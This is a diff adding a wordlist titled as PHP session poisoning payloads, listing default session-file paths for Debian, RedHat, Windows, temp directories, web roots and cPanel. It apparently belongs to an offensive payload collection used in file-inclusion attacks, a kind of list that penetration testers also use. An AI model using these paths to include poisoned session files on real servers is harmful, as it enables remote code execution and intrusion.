@@ -1,0 +1,41 @@
+# PHP Session Poisoning Payloads
+# Targets PHP session files after poisoning session data
+
+# Default PHP session paths (Debian/Ubuntu)
+/var/lib/php/sessions/sess_PHPSESSID
+/var/lib/php5/sessions/sess_PHPSESSID
+/var/lib/php7.0/sessions/sess_PHPSESSID
+/var/lib/php7.2/sessions/sess_PHPSESSID
+/var/lib/php7.4/sessions/sess_PHPSESSID
+/var/lib/php8.0/sessions/sess_PHPSESSID
+/var/lib/php8.1/sessions/sess_PHPSESSID
+/var/lib/php8.2/sessions/sess_PHPSESSID
+
+# RedHat/CentOS session paths
+/var/lib/php/session/sess_PHPSESSID
+/var/lib/php5/session/sess_PHPSESSID
+
+# Custom /tmp paths
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+/tmp/php_sessions/sess_PHPSESSID
+
+# Windows PHP session paths
+C:\Windows\Temp\sess_PHPSESSID
+C:\PHP\sessions\sess_PHPSESSID
+C:\xampp\tmp\sess_PHPSESSID
+C:\wamp\tmp\sess_PHPSESSID
+
+# Alternative temp directories
+/var/tmp/sess_PHPSESSID
+/usr/tmp/sess_PHPSESSID
+/usr/local/tmp/sess_PHPSESSID
+
+# Web server specific paths
+/var/www/sessions/sess_PHPSESSID
+/var/www/tmp/sess_PHPSESSID
+/var/www/html/sessions/sess_PHPSESSID
+
+# cPanel/WHM paths
+/home/USERNAME/tmp/sess_PHPSESSID
+/tmp/cpanel_php_sessions/sess_PHPSESSID
